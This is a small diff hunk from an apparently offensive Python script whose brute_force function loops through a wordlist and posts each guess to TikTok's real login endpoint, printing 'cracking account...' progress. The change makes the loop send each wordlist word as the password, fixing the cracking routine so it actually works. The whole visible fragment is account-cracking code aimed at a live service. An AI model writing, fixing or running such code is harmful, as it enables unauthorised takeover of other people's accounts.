@@ -73,7 +73,7 @@ def brute_force(user, password, wordlist):
         print(adv, f"cracking account...",f"{i+1}/{len(words)}", reset)
         response = requests.post('https://www.tiktok.com/node/login_v2/index', json={
             "username": user,
-            "password": password,
+            "password": word,
             "mix_mode": True,
             "captcha": "",
             "email": "",
